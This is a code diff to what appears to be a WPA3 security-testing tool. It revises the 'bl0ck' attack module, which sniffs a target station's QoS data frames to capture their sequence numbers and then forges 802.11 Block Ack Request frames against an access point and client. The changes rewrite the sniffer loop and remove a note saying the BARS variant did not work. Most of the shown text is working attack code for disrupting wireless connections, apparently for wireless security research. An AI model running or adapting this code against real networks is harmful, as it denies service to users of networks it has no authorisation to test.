@@ -34,7 +34,10 @@ namespace wpa3_tester::bl0ck_attack{
             0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
             0xff, 0xff, 0x7f, 0x92, 0x08, 0x80
         };
-        const RadioTap rt{}; // fill with driver?
+        RadioTap rt{}; // fill with driver?
+        //constexpr uint16_t channel_flags = RadioTap::OFDM | RadioTap::FIVE_GZ;
+        //rt.channel(5180, channel_flags);
+
         return rt / bar / RawPDU(payload_data);
     }
 
@@ -54,77 +57,60 @@ namespace wpa3_tester::bl0ck_attack{
     };
 
     RadioTap get_BARS_frame(const HWAddress<6> &ap_hw,
-                            const HWAddress<6> &sta_hw,
-                            const string& iface,
-                            const int timeout_sec) {
-        log(LogLevel::INFO, "BARS: Starting sniffer to capture QoS data from "+sta_hw.to_string());
+                    const HWAddress<6> &sta_hw,
+                    const string& iface,
+                    const int timeout_sec) {
 
-        struct SniffResult {
-            bool found = false;
-            uint8_t fn = 0;
-            uint16_t sn = 0;
-            mutex mtx;
-            condition_variable cv;
-        };
+        log(LogLevel::INFO, "BARS: Starting sniffer for %s (timeout: %ds)",
+            sta_hw.to_string().c_str(), timeout_sec);
 
-        auto result = make_shared<SniffResult>();
+        SnifferConfiguration config;
+        config.set_immediate_mode(true);
+        config.set_timeout(100);
+        config.set_promisc_mode(true);
+        config.set_filter("wlan type data and wlan addr2 " + sta_hw.to_string());
 
-        // Lambda to handle captured packets
-        auto packet_handler = [result, sta_hw](PDU& pdu) -> bool {
+        Sniffer sniffer(iface, config);
+        const auto start_time = steady_clock::now();
+        uint8_t found_fn = 0;
+        uint16_t found_sn = 0;
+        bool found = false;
+
+        while (true) {
+            const auto now = steady_clock::now();
+            if (duration_cast<seconds>(now - start_time).count() >= timeout_sec) {
+                break;
+            }
+
+            unique_ptr<PDU> pdu(sniffer.next_packet());
+
+            if (!pdu) {continue;}
+
+            if (const auto* dot11 = pdu->find_pdu<Dot11>()) {
+                log(LogLevel::DEBUG, "BARS: Packet from to %s",
+                    dot11->addr1().to_string().c_str());
+            }
+
             try {
-                const auto* dot11 = pdu.find_pdu<Dot11Data>();
-                if (!dot11) return true;
-
-                // check QoS data
-                if (dot11->type() == Dot11::DATA && dot11->subtype() == 0x08) {
-                    if (dot11->addr2() == sta_hw) { // check from the target STA
-                        log(LogLevel::INFO, "BARS: Captured QoS data from %s to %s",
-                            dot11->addr2().to_string().c_str(),
-                            dot11->addr1().to_string().c_str());
-
-                        // Extract sequence control field
-                        lock_guard lock(result->mtx);
-                        result->fn = dot11->frag_num();
-                        result->sn = dot11->seq_num();
-                        result->found = true;
-                        result->cv.notify_one();
-                        return false;
-                    }
+                if (const auto* qos = pdu->find_pdu<Dot11QoSData>()) {
+                    found_fn = qos->frag_num();
+                    found_sn = qos->seq_num();
+                    found = true;
+                    log(LogLevel::INFO, "BARS: Captured QoS data! SN: %u, FN: %u", found_sn, found_fn);
+                    break;
                 }
             } catch (const exception& e) {
-                log(LogLevel::WARNING, "BARS: Error processing packet: "+string(e.what()));
-            }
-            return true;
-        };
-
-        // sniffing in a separate thread
-        thread sniffer_thread([iface, packet_handler, result]() {
-            try {
-                SnifferConfiguration config;
-                config.set_promisc_mode(true);
-                config.set_filter("type data subtype 0x08");
-                config.set_timeout(100);
-                Sniffer sniffer(iface, config);
-                //TODO  sniff_loop isblcoksinr, use poll
-                sniffer.sniff_loop(packet_handler);
-            } catch (const exception& e) {
-                log(LogLevel::ERROR, "BARS: Sniffer error: "+string(e.what()));
-                lock_guard lock(result->mtx);
-                result->found = false;
-                result->cv.notify_one();
-            }
-        });
-
-        {  // Wait for QoS data or timeout
-            unique_lock lock(result->mtx);
-            if (!result->cv.wait_for(lock, seconds(timeout_sec), [result]() { return result->found; })) {
-                throw runtime_error("BARS: Timeout waiting for QoS data from "+sta_hw.to_string());
+                log(LogLevel::WARNING, "BARS: Error parsing: %s", e.what());
             }
         }
 
-        if (sniffer_thread.joinable()) {sniffer_thread.detach();}
-        return get_BAR_frame(ap_hw, sta_hw, result->fn, result->sn);
+        if (!found) {
+            throw runtime_error("BARS: Timeout waiting for QoS data from " + sta_hw.to_string());
+        }
+
+        return get_BAR_frame(ap_hw, sta_hw, found_fn, found_sn);
     }
+
 
     void block(const string& STA_mac,
                const string& AP_mac,
@@ -135,7 +121,7 @@ namespace wpa3_tester::bl0ck_attack{
                const bool is_random) {
         assert(attack_type == "BAR" || attack_type == "BA" || attack_type == "BARS");
 
-        log(LogLevel::INFO, "Starting BARorBA exploit - Type: %s", attack_type.c_str());
+        log(LogLevel::INFO, "Starting bl0ck exploit - Type: %s", attack_type.c_str());
 
         const NetworkInterface iface_obj(iface);
         const HWAddress<6> ap_hw(AP_mac);
@@ -148,9 +134,8 @@ namespace wpa3_tester::bl0ck_attack{
 
         RadioTap bars_frame;
         if (attack_type == "BARS") {
-            //TODO BARS dont work
             const HWAddress<6> sta_hw = is_random ? HWAddress<6>(hw_capabilities::rand_mac()) : HWAddress<6>(STA_mac);
-            bars_frame = get_BARS_frame(ap_hw, sta_hw, iface, 30);
+            bars_frame = get_BARS_frame(ap_hw, sta_hw, iface, 10);
             log(LogLevel::INFO, "BARS: Frame prepared with captured sequence number");
         }
 
@@ -226,8 +211,8 @@ namespace wpa3_tester::bl0ck_attack{
         observer::start_tshark(rs, "attacker", mac_filter); //FIXME
         observer::start_tshark(rs, "client", mac_filter); //FIXME
         //observer::start_tshark(rs, "access_point", mac_filter);
-
         //iperf_conn(rs, "client",  "access_point");
+        rs.start_observers();
     }
 
 
